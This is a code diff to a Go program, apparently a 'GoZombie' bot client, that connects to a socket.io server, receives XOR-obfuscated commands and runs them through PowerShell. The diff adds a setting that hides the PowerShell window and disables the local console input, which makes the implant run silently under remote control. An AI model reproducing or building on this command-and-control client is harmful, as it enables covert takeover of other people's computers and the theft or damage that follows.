@@ -1,7 +1,7 @@
 package main
 
 import (
-	"bufio"
+	//"bufio"
 	"bytes"
 	"fmt"
 	"github.com/UPSJustin/GoZombie/zsupport" //support functions
@@ -13,6 +13,7 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"syscall"
 )
 
 var (
@@ -36,8 +37,6 @@ func main() {
 	key := "KCQ"
     
 	zsupport.OutMessage("Starting Cain")
-
-
 
 	opts := &socketio_client.Options{
 		Transport: "websocket",
@@ -100,7 +99,7 @@ func main() {
 				
 				
 				cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output[1]))
-				
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				cmdOutput := &bytes.Buffer{}
 				cmd.Stdout = cmdOutput
 				err := cmd.Run()
@@ -121,16 +120,16 @@ func main() {
 	})
 
 	//Read data from console to send custom messages
-	reader := bufio.NewReader(os.Stdin)
+	//reader := bufio.NewReader(os.Stdin)
 
 	for {
-		data, _, _ := reader.ReadLine()
+		//data, _, _ := reader.ReadLine()
 
-		command := string(data)
+		//command := string(data)
 
-  		encrypted := xor.EncryptDecrypt(command, key)
+  		//encrypted := xor.EncryptDecrypt(command, key)
 
-		client.Emit("jnkcyp", encrypted)
-		log.Printf("send message:%v\n", encrypted)
+		//client.Emit("jnkcyp", encrypted)
+		//log.Printf("send message:%v\n", encrypted)
 	}
 }
